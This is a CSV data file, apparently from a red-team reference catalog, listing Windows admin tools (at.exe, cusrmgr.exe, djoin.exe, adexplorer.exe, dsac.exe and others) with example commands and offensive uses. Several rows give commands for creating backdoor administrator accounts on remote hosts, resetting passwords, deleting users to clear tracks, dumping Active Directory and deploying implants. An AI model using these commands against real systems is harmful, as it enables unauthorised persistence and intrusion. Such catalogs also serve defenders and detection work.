"finger.exe","Displays information about a user on a specified system running the Finger service","2023-07-01","[''Builtin''-|-''TODO'']","","finger.exe","TODO","None","Network","None","None","None","None","","Arris Huijgen","bitsadmin","","false"
"eventcreate.exe","Create a custom event in a specified event log","2023-07-01","Builtin","","eventcreate.exe /S W10.ad.bitsadmin.com /T Error /ID 100 /L Application /D ""Some description""","Write error to Application event log","None","Logs","No events can be written to the Security event log","None","None","None","","Arris Huijgen","bitsadmin","","false"
"dsrm.exe","Deletes objects from the directory","2023-07-01","[''RSAT''-|-''TODO'']","","dsrm.exe","TODO","None","Domain","Not sure if part of RSAT or not","None","None","None","","Arris Huijgen","bitsadmin","","false"
"dsquery.exe","This tool's commands suite allow you to query the directory according to specified criteria. Each of the following dsquery commands finds objects of a specific object type, with the exception of dsquery *, which can query for any type of object","2023-07-01","[''RSAT''-|-''TODO'']","","dsquery.exe","TODO","None","Domain","Not sure if part of RSAT or not","None","None","None","","Arris Huijgen","bitsadmin","","false"
"dsmove.exe","Moves or renames an object within the directory","2023-07-01","[''RSAT''-|-''TODO'']","","dsmove.exe","TODO","None","Domain","Not sure if part of RSAT or not","None","None","None","","Arris Huijgen","bitsadmin","","false"
"dsmod.exe","Modifies existing objects in the directory","2023-07-01","[''RSAT''-|-''TODO'']","","dsmod.exe","TODO","None","Domain","Not sure if part of RSAT or not","None","None","None","","Arris Huijgen","bitsadmin","","false"
"dsmgmt.exe","Facilitates managing AD DS/LDS application partitions, management and control of the Flexible Single Master Operations (FSMO), and cleaning up of metadata left behind by abandoned AD DCs/LDS instances","2023-07-01","[''RSAT''-|-''TODO'']","","dsmgmt.exe","TODO","None","Domain","Not sure if part of RSAT or not","None","None","None","","Arris Huijgen","bitsadmin","","false"
"dsget.exe","Display the selected properties of a specific object in the directory","2023-07-01","[''RSAT''-|-''TODO'']","","dsget.exe","TODO","None","Domain","Not sure if part of RSAT or not","None","None","None","","Arris Huijgen","bitsadmin","","false"
"dsadd.exe","Add specific types of objects to the directory","2023-07-01","[''RSAT''-|-''TODO'']","","dsadd.exe","TODO","None","Domain","Not sure if part of RSAT or not","None","None","None","","Arris Huijgen","bitsadmin","","false"
"dsacls.exe","Displays or modifies permissions (ACLS) of an Active Directory Domain Services (AD DS) Object","2023-07-01","[''RSAT''-|-''TODO'']","","dsacls.exe","TODO","None","Domain","Not sure if part of RSAT or not","None","None","None","","Arris Huijgen","bitsadmin","","false"
"dsac.exe","Active Directory Administrative Center","2023-07-01","[''GUI''-|-''RSAT'']","","dsac.exe","Active Directory Administrative Center","View user's BitLocker recovery passwords, reset user's passwords and modify security of objects and OUs","Domain","[''Manage -> Add Navigation Nodes -> Connect to other domains -> Connect to: `ad.bitsadmin.com`''-|-''Needs to be executed from a OffensiveDC with a dummy domain (e.g. a Windows Server machine with a local `hacker.local` domain) in a `runas /netonly` context'']","None","None","","","Arris Huijgen","bitsadmin","[''389/UDP''-|-''389/TCP''-|-''9389/TCP''-|-''445/TCP'']","false"
"driverquery.exe","Display a list of installed device drivers","2023-07-01","Builtin","","driverquery.exe /s W10.ad.bitsadmin.com","List drivers","Identify drivers of security solutions that are installed","Recon","None","TA0043","None","None","","Arris Huijgen","bitsadmin","","false"
"dnscmd.exe","Command-line interface for managing DNS servers","2023-07-01","[''RSAT''-|-''TODO'']","","dnscmd.exe","TODO","None","Manage","Not sure if part of RSAT or not","None","None","None","","Arris Huijgen","bitsadmin","","false"
"djoin.exe","Provision a computer account in the domain","2023-07-01","[''RSAT''-|-''TODO'']","","djoin.exe /PROVISION /DOMAIN ad.bitsadmin.com /MACHINE hacker /SAVEFILE hacker.txt /DEFPWD /PRINTBLOB /NETBIOS hacker","Provision new computer account","None","Domain","Not sure if part of RSAT or not","None","None","None","","Arris Huijgen","bitsadmin","","false"
"dfsutil.exe","Manage DFS Namespaces, servers, and clients","2023-07-01","RSAT","","dfsutil.exe root \\ad.bitsadmin.com\Users","List DFS servers of namespace","None","Data","[''Obtains the information from the DC via port 445/TCP -> DCE/RPC -> Settings for Microsoft Distributed File System''-|-''Performs (many) resolves via DNS.'']","None","None","None","","Arris Huijgen","bitsadmin","","false"
"dfsrdiag.exe","DFS Replication operational and diagnostics command line utility","2023-07-01","[''RSAT''-|-''TODO'']","","dfsrdiag.exe","TODO","None","Manage","Not sure if part of RSAT or not","None","None","None","","Arris Huijgen","bitsadmin","","false"
"dfsdiag.exe","Provides diagnostic information for DFS Namespaces","2023-07-01","[''RSAT''-|-''TODO'']","","dfsdiag.exe","TODO","None","Manage","Not sure if part of RSAT or not","None","None","None","","Arris Huijgen","bitsadmin","","false"
"dfscmd.exe","Configures DFS folders and folder targets in a DFS namespace","2023-07-01","[''RSAT''-|-''TODO'']","","dfscmd.exe","TODO","None","Manage","Not sure if part of RSAT or not","None","None","None","","Arris Huijgen","bitsadmin","","false"
"devcon.exe","Displays detailed information about devices","2023-07-01","Extra","","devcon.exe -m:\\W10.ad.bitsadmin.com find *","List drivers","Identify drivers of security solutions that are installed","Recon","Part of Tools component of Windows Driver Kit (WDK)","TA0043","https://learn.microsoft.com/en-us/windows-hardware/drivers/download-the-wdk","None","","Arris Huijgen","bitsadmin","","false"
"dcdiag.exe","Directory Server Diagnosis","2023-07-01","[''RSAT''-|-''TODO'']","","dcdiag.exe","TODO","None","Domain","Not sure if part of RSAT or not","None","None","None","","Arris Huijgen","bitsadmin","","false"
"cusrmgr.exe","Manage local user accounts","2023-07-01","Extra","","[''cusrmgr.exe -u TargetUser -P Password1! -m \\W10.ad.bitsadmin.com''-|-''cusrmgr.exe -u TargetUser -alg Administrators -m \\W10.ad.bitsadmin.com''-|-''cusrmgr.exe -u TargetUser -d -m \\W10.ad.bitsadmin.com'']","[''Update password''-|-''Add user to local Administrators group''-|-''Delete user'']","[''Backdoor account''-|-''Backdoor account''-|-''Clear tracks'']","[''Manage''-|-''Manage''-|-''Manage'']","[''Part of the Windows 2000 Resource Kit''-|-''Part of the Windows 2000 Resource Kit''-|-''Part of the Windows 2000 Resource Kit'']","[''None''-|-''None''-|-''None'']","None","None","","Arris Huijgen","bitsadmin","","false"
"csvde.exe","Imports and exports data from Active Directory Domain Services (AD DS) using files that store data in the comma-separated value (CSV) format","2023-07-01","[''Builtin''-|-''TODO'']","","csvde.exe -m -f users.csv -s DC1.ad.bitsadmin.com -d ""cn=users,DC=ad,DC=bitsadmin,DC=com"" -r ""(objectClass=user)""","Query all users","Query LDAP over the commandline","Domain","Not sure if built-in","None","None","None","","Arris Huijgen","bitsadmin","","false"
"at.exe","Schedules commands and programs to run on a computer at a specified time and date","2023-11-04","Builtin","","[''at.exe \\W10.ad.bitsadmin.com 06:00 cmd /c ""net user Hacker H4ck#rt /add & net localgroup Administrators Hacker /add""''-|-''at.exe \\W10.ad.bitsadmin.com'']","[''Execute task''-|-''List tasks'']","[''Create backdoor user or launch implant''-|-''List current tasks to identify a name that can be used for a new task to blend in'']","[''Execute''-|-''Recon'']","[''Deprecated in favor of [schtasks.exe](../schtasks)''-|-''None'']","[''T1053.002''-|-''T1053.002'']","None","None","","Arris Huijgen","bitsadmin","","false"
"adrestore.exe","Enumerates deleted (tombstoned) objects in a domain and gives you the option of restoring each one","2023-07-01","[''Sysinternals''-|-''TODO'']","","adrestore.exe","TODO","None","Domain","None","None","None","None","","Arris Huijgen","bitsadmin","","false"
"adexplorer.exe","Advanced Active Directory (AD) viewer and editor","2023-08-25","[''GUI''-|-''Sysinternals'']","","[''adexplorer.exe''-|-''adexplorer.exe -snapshot ad.bitsadmin.com:636 ad.bitsadmin.com.dat'']","[''Interactively browse LDAP''-|-''Obtain dump of Active Directory over TLS'']","[''Via File -> Connect, connect to a domain controller''-|-''If adexplorer is running in the context of a domain, the ""Connect to"" field can be left empty as it automatically connects to a DC of the current domain''-|-''When User and Password fields are left empty, Kerberos authentication is used''-|-''Offline evaluation of the AD to identify vulnerabilities and attack paths'']","[''Domain''-|-''Domain'']","[''None''-|-''Can be viewed offline using ADExplorer''-|-''Can also be imported to BloodHound format using ADExplorerSnapshot.py or to Adalanche (see references)'']","[''None''-|-''None'']","[''https://blog.bitsadmin.com/dealing-with-large-bloodhound-datasets''-|-''https://github.com/c3c/ADExplorerSnapshot.py''-|-''https://github.com/lkarlslund/Adalanche'']","","","Arris Huijgen","bitsadmin","[''389/TCP''-|-''636/TCP'']","false"
"WinAppDeployCmd.exe","Deploy a Universal Windows Platform (UWP) app to any Windows 10 device","2023-07-01","Extra","","WinAppDeployCmd.exe list -ip 10.0.10.51","Show the list of installed UWP apps","None","Manage","Part of the Windows 10 SDK","None","https://learn.microsoft.com/en-us/windows/uwp/packaging/install-universal-windows-apps-with-the-winappdeploycmd-tool","None","","Arris Huijgen","bitsadmin","","false"
"TpmVscMgr.exe","Create and delete TPM virtual smart cards","2023-07-01","[''Builtin''-|-''TODO'']","","TpmVscMgr.exe create /machine W11.ad.bitsadmin.com /name MyVSC /pin default /adminkey random /generate","Create virtual smart card","None","Misc","None","None","None","None","","Arris Huijgen","bitsadmin","","false"
"Ssms.exe","SQL Server Management Studio (SSMS)","2023-11-04","[''Extra''-|-''GUI'']","","""C:\Program Files (x86)\Microsoft SQL Server Management Studio 19\Common7\IDE\Ssms.exe""","SQL Server Management Studio (SSMS)","Connect to MSSQL database and execute commands on the underlying OS using the `xp_cmdshell` stored procedure, execute CLR code or pivot over MSSQL server links","Manage","[''Download link in resources''-|-''See also [SQLServerManager15.msc](../../MMC/SQLServerManager15)'']","None","https://learn.microsoft.com/en-us/sql/ssms/download-sql-server-management-studio-ssms","None","","Arris Huijgen","bitsadmin","","false"
"SmeDesktop.exe","Windows Admin Center","2023-08-25","[''Extra''-|-''GUI'']","","""C:\Program Files\Windows Admin Center\SmeDesktop.exe""","Manage machines","Manage Certificates, Devices, Events, Files & file sharing, Firewall, Installed apps, Local users & groups, Networks, Performance Monitor, PowerShell, Processes, Registry, Remote Desktop, Roles & features, Scheduled tasks, Services, Storage, Storage Migration Service, Storage Replica, System Insights and Updates","Manage","[''Download and install Windows Admin Center and install it''-|-''Underlying extensively uses WinRM'']","None","https://www.microsoft.com/evalcenter/download-windows-admin-center","None","","Arris Huijgen","bitsadmin","","false"
"ServerManager.exe","Manage roles and features on servers in the domain","2023-07-01","[''GUI''-|-''RSAT'']","","ServerManager.exe","Server Manager","Manage roles and features on servers","Manage","Add other servers to manage -> DNS -> `DC1.ad.bitsadmin.com` -> Enter -> Arrow -> OK","None","None","","","Arris Huijgen","bitsadmin","[''5985/TCP''-|-''5986/TCP'']","false"
"RDCMan.exe","Remote Desktop Connection Manager","2024-12-13","[''GUI''-|-''Sysinternals'']","","RDCMan.exe","Remote Desktop","None","Sessions","[''Session -> Connect To (Ctrl + Q) -> Enter server name''-|-''See also [mstsc.exe](../mstsc)'']","T1021.001","None","None","","Arris Huijgen","bitsadmin","","false"
"Microsoft.ConfigurationManagement.exe","Microsoft Configuration Manager (MCM)","2023-11-04","[''Extra''-|-''GUI'']","","""C:\Program Files (x86)\Microsoft Endpoint Manager\AdminConsole\bin\Microsoft.ConfigurationManagement.exe""","Manage Microsoft Configuration Manager (MCM)","[''Collect information about systems''-|-''Deploy software implant to system'']","Manage","[''Download software, including Configuration Manager console on reference 1''-|-''Installation instructions on reference 2''-|-''At the Microsoft Configuration main screen, choose ""Install Configuration Manager console""''-|-''Add the `SMS:DebugView` parameter to the commandline to get an additional option (Tools) in the menu''-|-''Formerly known as System Center Configuration Manager (SCCM)'']","None","[''https://www.microsoft.com/en-us/evalcenter/download-microsoft-endpoint-configuration-manager''-|-''https://learn.microsoft.com/en-us/mem/configmgr/core/servers/deploy/install/install-consoles''-|-''https://http418infosec.com/offensive-sccm-summary'']","None","","Arris Huijgen","bitsadmin","","false"
"AccessEnum.exe","Displays who has access to items within a directory or registry key","2023-07-01","[''GUI''-|-''Sysinternals'']","","AccessEnum.exe","Enumerate share permissions","Identify writable files and folders on a share which can be backdoored","Data","Share first needs to be mounted to the local system as a drive; AccessEnum does not support scanning network shares","T1083","None","None","","Arris Huijgen","bitsadmin","","false"
